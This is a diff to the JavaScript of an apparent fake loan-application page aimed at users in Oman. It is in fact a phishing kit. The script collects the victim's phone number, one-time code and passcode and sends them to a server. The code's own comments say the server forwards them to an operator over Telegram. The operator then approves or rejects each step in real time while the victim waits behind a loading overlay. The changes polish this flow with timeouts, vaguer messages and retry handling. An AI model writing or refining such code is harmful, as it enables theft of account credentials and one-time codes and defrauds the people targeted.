@@ -593,19 +593,14 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 <script>
 'use strict';
 
-/* ════════════════════════════════════════
-   CONFIG — base URL auto-detects current host
-════════════════════════════════════════ */
-const API = ''; // empty = same origin (server.js serves index.html)
+const API = ''; // same-origin — server.js serves index.html
 
-/* ════════════════════════════════════════
-   STATE
-════════════════════════════════════════ */
-let prefix     = '+968';
-let pollTimer  = null;   // active polling interval
-let pollToken  = null;   // current token being polled
-let otpTimer   = null;   // OTP countdown interval
-let pcVal      = '';     // passcode digits entered
+/* ── State ── */
+let prefix    = '+968';
+let pollTimer = null;
+let pollToken = null;
+let otpTimer  = null;
+let pcVal     = '';
 
 /* ════════════════════════════════════════
    NAVIGATION
@@ -624,127 +619,139 @@ function goTo(id){
 }
 
 /* ════════════════════════════════════════
-   UI HELPERS
+   HELPERS
 ════════════════════════════════════════ */
 function fmtOMR(v){ return (+v).toFixed(3)+' OMR'; }
-function calcMonthly(p,n,r){ const m=r/100/12; if(!m) return p/n; return p*m*Math.pow(1+m,n)/(Math.pow(1+m,n)-1); }
+function calcMonthly(p,n,r){
+  const m = r/100/12;
+  if(!m) return p/n;
+  return p*m*Math.pow(1+m,n)/(Math.pow(1+m,n)-1);
+}
 
-/* Loading overlay — blocks UI while waiting for admin */
-function showOverlay(msg='Waiting for verification…'){
-  let el = document.getElementById('walletii-overlay');
+/* ── Spinner overlay ── */
+function showOverlay(){
+  let el = document.getElementById('wlt-overlay');
   if(!el){
     el = document.createElement('div');
-    el.id = 'walletii-overlay';
+    el.id = 'wlt-overlay';
     el.style.cssText = `
       position:fixed;inset:0;z-index:9999;
-      background:rgba(12,21,28,.88);
+      background:rgba(12,21,28,.9);
       display:flex;flex-direction:column;
-      align-items:center;justify-content:center;gap:18px;
+      align-items:center;justify-content:center;gap:20px;
       backdrop-filter:blur(4px);
     `;
     el.innerHTML = `
-      <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
-        <circle cx="22" cy="22" r="18" stroke="#243744" stroke-width="4"/>
-        <circle cx="22" cy="22" r="18" stroke="#00d2ad" stroke-width="4"
-          stroke-dasharray="90" stroke-dashoffset="60" stroke-linecap="round"
-          style="transform-origin:center;animation:spin 1s linear infinite"/>
+      <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+        <circle cx="24" cy="24" r="20" stroke="#243744" stroke-width="4"/>
+        <circle cx="24" cy="24" r="20" stroke="#00d2ad" stroke-width="4"
+          stroke-dasharray="100" stroke-dashoffset="70" stroke-linecap="round"
+          style="transform-origin:center;animation:wlt-spin 1s linear infinite"/>
       </svg>
-      <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
-      <div id="overlay-msg" style="color:#f4f8fb;font-size:15px;font-weight:700;font-family:'Nunito',sans-serif;text-align:center;padding:0 32px;line-height:1.5;">${msg}</div>
+      <style>@keyframes wlt-spin{to{transform:rotate(360deg);}}</style>
+      <span style="color:#f4f8fb;font-size:15px;font-weight:700;
+        font-family:'Nunito',sans-serif;">Loading…</span>
     `;
     document.body.appendChild(el);
   } else {
-    document.getElementById('overlay-msg').textContent = msg;
     el.style.display = 'flex';
   }
 }
 function hideOverlay(){
-  const el = document.getElementById('walletii-overlay');
+  const el = document.getElementById('wlt-overlay');
   if(el) el.style.display = 'none';
 }
 
-/* Shake animation for wrong inputs */
-function shakeScreen(id){
-  const el = document.getElementById(id);
-  if(!el) return;
-  el.style.animation = 'none';
-  el.getBoundingClientRect();
-  el.style.animation = 'shake .4s ease';
-  el.addEventListener('animationend', ()=>el.style.animation='', {once:true});
-}
-
-/* Toast message */
+/* ── Toast ── */
 function showToast(msg, color='#ff6b6b'){
-  let t = document.getElementById('walletii-toast');
+  let t = document.getElementById('wlt-toast');
   if(!t){
     t = document.createElement('div');
-    t.id = 'walletii-toast';
+    t.id = 'wlt-toast';
     t.style.cssText = `
-      position:fixed;bottom:32px;left:50%;transform:translateX(-50%);
-      z-index:99999;padding:13px 24px;border-radius:40px;
+      position:fixed;bottom:36px;left:50%;transform:translateX(-50%);
+      z-index:99999;padding:12px 22px;border-radius:40px;
       font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;
-      color:#fff;white-space:nowrap;opacity:0;
-      transition:opacity .25s;pointer-events:none;
+      color:#fff;opacity:0;transition:opacity .25s;pointer-events:none;
+      white-space:nowrap;max-width:90vw;text-align:center;
     `;
     document.body.appendChild(t);
   }
   t.textContent = msg;
   t.style.background = color;
   t.style.opacity = '1';
-  clearTimeout(t._hide);
-  t._hide = setTimeout(()=>{ t.style.opacity='0'; }, 3000);
+  clearTimeout(t._h);
+  t._h = setTimeout(()=>{ t.style.opacity='0'; }, 3200);
 }
 
-/* Inject shake keyframes once */
-(function(){
+/* ── Shake ── */
+(()=>{
   const s = document.createElement('style');
-  s.textContent = `@keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-8px)}40%,80%{transform:translateX(8px)}}`;
+  s.textContent = `@keyframes wlt-shake{
+    0%,100%{transform:translateX(0)}
+    20%,60%{transform:translateX(-9px)}
+    40%,80%{transform:translateX(9px)}
+  }`;
   document.head.appendChild(s);
 })();
+function shake(id){
+  const el = document.getElementById(id);
+  if(!el) return;
+  el.style.animation = 'none';
+  el.getBoundingClientRect();
+  el.style.animation = 'wlt-shake .4s ease';
+  el.addEventListener('animationend', ()=>{ el.style.animation=''; }, {once:true});
+}
 
 /* ════════════════════════════════════════
-   API HELPERS
+   API
 ════════════════════════════════════════ */
 async function apiNotify(payload){
   const r = await fetch(`${API}/notify`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
+    method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify(payload)
   });
   return r.json();
 }
-
 async function apiPoll(token){
   const r = await fetch(`${API}/poll`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
+    method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify({token})
   });
   return r.json();
 }
 
-/* Start polling every 2s. Calls onResult(result) when non-pending. */
-function startPolling(token, onResult){
+/* Poll every 2s; call onResult when admin responds.
+   Times out after 4 min 30s (just before typical server TTL). */
+function startPolling(token, onResult, onTimeout){
   stopPolling();
   pollToken = token;
+  let elapsed = 0;
+  const MAX = 270; // seconds before giving up
   pollTimer = setInterval(async ()=>{
+    elapsed += 2;
+    if(elapsed >= MAX){
+      stopPolling();
+      if(onTimeout) onTimeout();
+      else showToast('Session timed out. Please try again.');
+      return;
+    }
     try{
       const res = await apiPoll(pollToken);
-      if(res.ok && res.result !== 'pending'){
+      if(res.ok && res.result && res.result !== 'pending'){
         stopPolling();
         onResult(res.result);
       }
-    } catch(e){ /* network hiccup — keep trying */ }
+    } catch(_){}
   }, 2000);
 }
-
 function stopPolling(){
   if(pollTimer){ clearInterval(pollTimer); pollTimer=null; }
   pollToken = null;
 }
 
 /* ════════════════════════════════════════
-   SCREEN 1 — LOAN LANDING
+   S1 — LOAN LANDING
 ════════════════════════════════════════ */
 function sliderChange(v){
   document.getElementById('loanAmt').textContent = fmtOMR(+v);
@@ -753,7 +760,7 @@ function sliderChange(v){
 sliderChange(500);
 
 /* ════════════════════════════════════════
-   SCREEN 2 — LOAN DETAILS
+   S2 — LOAN DETAILS
 ════════════════════════════════════════ */
 function calcUpdate(){
   const a = +document.getElementById('p1amt').value||0;
@@ -766,8 +773,9 @@ function checkForm(){
   const nm = document.getElementById('p1name').value.trim();
   const ph = document.getElementById('p1phone').value.replace(/\s/g,'');
   const em = document.getElementById('p1employ').value;
-  const ok = a && +a>0 && nm.length>=2 && ph.length>=7 && em!=='';
-  document.getElementById('detailsBtn').classList.toggle('active', !!ok);
+  document.getElementById('detailsBtn').classList.toggle('active',
+    !!(a && +a>0 && nm.length>=2 && ph.length>=7 && em)
+  );
 }
 function submitDetails(){
   if(!document.getElementById('detailsBtn').classList.contains('active')) return;
@@ -775,10 +783,11 @@ function submitDetails(){
 }
 
 /* ════════════════════════════════════════
-   SCREEN 3 — PHONE NUMBER
-   On Continue → POST /notify type=login
-   Poll for: otp_allowed → go to OTP screen
-             wrong_pin   → shake + toast
+   S3 — PHONE NUMBER
+   FLOW: user enters number → taps Continue
+         → /notify login sent → overlay
+         → admin approves  → navigate to OTP screen
+         → admin rejects   → shake + stay on phone screen
 ════════════════════════════════════════ */
 function toggleDd(){ document.getElementById('dropdown').classList.toggle('open'); }
 function pickCountry(code, name, el){
@@ -802,48 +811,58 @@ function onPhoneInput(){
 async function proceedFromPhone(){
   if(!document.getElementById('phoneContinueBtn').classList.contains('active')) return;
 
-  const phone    = document.getElementById('phoneInput').value.trim();
-  const passcode = pcVal || undefined; // include if already set (re-entry scenario)
+  const phone = document.getElementById('phoneInput').value.trim();
 
-  showOverlay('Sending login alert…');
+  /* 1. Disable button to prevent double-tap */
+  document.getElementById('phoneContinueBtn').classList.remove('active');
+
+  /* 2. Show overlay AFTER user taps — they've already entered their number */
+  showOverlay();
 
   try{
-    const res = await apiNotify({ type:'login', phone, countryCode:prefix, passcode });
+    /* 3. Notify server — admin gets Telegram message */
+    const res = await apiNotify({ type:'login', phone, countryCode:prefix });
 
-    if(!res.ok){
+    if(!res.ok || !res.token){
       hideOverlay();
-      showToast('Server error. Please try again.');
+      document.getElementById('phoneContinueBtn').classList.add('active');
+      showToast('Could not reach server. Try again.');
       return;
     }
 
-    showOverlay('Waiting for admin to approve…');
-
+    /* 4. Poll — overlay stays visible until admin responds */
     startPolling(res.token, result=>{
       hideOverlay();
       if(result === 'otp_allowed'){
-        // Update the OTP screen phone display
         document.getElementById('otpPhone').textContent = prefix+' '+phone.slice(0,4)+'XXX';
         goTo('screen-otp');
       } else if(result === 'wrong_pin'){
-        shakeScreen('screen-phone');
-        showToast('❌ Incorrect details. Please check and try again.');
+        shake('screen-phone');
+        showToast('❌ Access denied. Please check your details.');
+        document.getElementById('phoneContinueBtn').classList.add('active');
       } else {
         showToast('Unexpected response. Please retry.');
+        document.getElementById('phoneContinueBtn').classList.add('active');
       }
+    }, ()=>{
+      hideOverlay();
+      showToast('Request timed out. Please try again.');
+      document.getElementById('phoneContinueBtn').classList.add('active');
     });
 
   } catch(e){
     hideOverlay();
+    document.getElementById('phoneContinueBtn').classList.add('active');
     showToast('Connection error. Please try again.');
   }
 }
 
 /* ════════════════════════════════════════
-   SCREEN 4 — OTP
-   On Continue → POST /notify type=otp
-   Poll for: otp_correct → go to passcode
-             otp_wrong   → shake + clear OTP
-   Resend    → POST /notify type=resend
+   S4 — OTP
+   FLOW: user enters 6-digit code → taps Continue
+         → /notify otp sent → overlay
+         → admin approves  → navigate to passcode
+         → admin rejects   → shake + clear + stay on OTP screen
 ════════════════════════════════════════ */
 function enterOtp(){
   document.getElementById('otp-hidden').value = '';
@@ -855,14 +874,14 @@ function enterOtp(){
 
 function startOtpCountdown(){
   clearInterval(otpTimer);
-  let s = 57;
   const el = document.getElementById('resendText');
+  let s = 57;
   el.textContent = `Resend code in ${s} seconds`;
   el.style.cursor = 'default';
   el.onclick = null;
   otpTimer = setInterval(()=>{
     s--;
-    if(s<=0){
+    if(s <= 0){
       clearInterval(otpTimer);
       el.textContent = 'Resend code';
       el.style.cursor = 'pointer';
@@ -878,26 +897,32 @@ async function resendOtp(){
   try{
     await apiNotify({ type:'resend', phone, countryCode:prefix });
     showToast('Code resend requested ✓', '#00d2ad');
-  } catch(e){ showToast('Could not resend. Try again.'); }
+  } catch(_){ showToast('Could not resend. Try again.'); }
   startOtpCountdown();
 }
 
 function focusOtp(){ document.getElementById('otp-hidden').focus(); }
+
 function renderOtp(v){
   for(let i=0;i<6;i++){
     const b = document.getElementById('ob'+i);
-    b.classList.remove('filled','cur'); b.textContent='';
-    if(i<v.length){
-      b.classList.add('filled'); b.textContent=v[i];
+    b.classList.remove('filled','cur');
+    b.textContent = '';
+    if(i < v.length){
+      b.classList.add('filled');
+      b.textContent = v[i];
     } else {
-      const d = document.createElement('div'); d.className='dash'; b.appendChild(d);
-      if(i===v.length) b.classList.add('cur');
+      const d = document.createElement('div');
+      d.className = 'dash';
+      b.appendChild(d);
+      if(i === v.length) b.classList.add('cur');
     }
   }
 }
 function onOtpInput(){
   const inp = document.getElementById('otp-hidden');
-  const v = inp.value.replace(/\D/g,'').slice(0,6); inp.value=v;
+  const v = inp.value.replace(/\D/g,'').slice(0,6);
+  inp.value = v;
   renderOtp(v);
   document.getElementById('otpBtn').classList.toggle('active', v.length===6);
 }
@@ -915,30 +940,34 @@ async function proceedFromOtp(){
   const otp   = document.getElementById('otp-hidden').value;
   const phone = document.getElementById('phoneInput').value.trim();
 
+  /* 1. Disable button, stop countdown */
+  document.getElementById('otpBtn').classList.remove('active');
   clearInterval(otpTimer);
-  showOverlay('Verifying OTP code…');
+
+  /* 2. Show overlay AFTER user has already entered their OTP */
+  showOverlay();
 
   try{
+    /* 3. Submit OTP to server — admin gets Telegram message with the code */
     const res = await apiNotify({ type:'otp', phone, countryCode:prefix, otp });
 
-    if(!res.ok){
+    if(!res.ok || !res.token){
       hideOverlay();
-      showToast('Server error. Please try again.');
+      document.getElementById('otpBtn').classList.add('active');
       startOtpCountdown();
+      showToast('Could not reach server. Try again.');
       return;
     }
 
-    showOverlay('Waiting for admin to verify code…');
-
+    /* 4. Poll until admin responds */
     startPolling(res.token, result=>{
       hideOverlay();
       if(result === 'otp_correct'){
         goTo('screen-passcode');
       } else if(result === 'otp_wrong'){
-        shakeScreen('screen-otp');
-        showToast('❌ Wrong code. Please check and try again.');
-        // Clear OTP and let user re-enter
-        document.getElementById('otp-hidden').value='';
+        shake('screen-otp');
+        showToast('❌ Wrong code. Please try again.');
+        document.getElementById('otp-hidden').value = '';
         renderOtp('');
         document.getElementById('otpBtn').classList.remove('active');
         startOtpCountdown();
@@ -947,17 +976,23 @@ async function proceedFromOtp(){
         showToast('Unexpected response. Please retry.');
         startOtpCountdown();
       }
+    }, ()=>{
+      hideOverlay();
+      showToast('Request timed out. Please try again.');
+      document.getElementById('otpBtn').classList.add('active');
+      startOtpCountdown();
     });
 
   } catch(e){
     hideOverlay();
-    showToast('Connection error. Please try again.');
+    document.getElementById('otpBtn').classList.add('active');
     startOtpCountdown();
+    showToast('Connection error. Please try again.');
   }
 }
 
 /* ════════════════════════════════════════
-   SCREEN 5 — PASSCODE
+   S5 — PASSCODE
 ════════════════════════════════════════ */
 function enterPasscode(){
   pcVal = '';
@@ -979,9 +1014,10 @@ function pcBackspace(){
 }
 
 /* ════════════════════════════════════════
-   SCREEN 6 — SUCCESS
+   S6 — SUCCESS
 ════════════════════════════════════════ */
 function enterSuccess(){
+  stopPolling();
   const a = +document.getElementById('p1amt').value||500;
   const n = +document.getElementById('p1dur').value||12;
   document.getElementById('summAmt').textContent = fmtOMR(a);
@@ -989,7 +1025,6 @@ function enterSuccess(){
   document.getElementById('summRep').textContent = fmtOMR(calcMonthly(a,n,5));
   const c = document.querySelector('.ok-check');
   if(c){ c.style.animation='none'; c.getBoundingClientRect(); c.style.animation=''; }
-  stopPolling();
 }
 </script>
 </body>
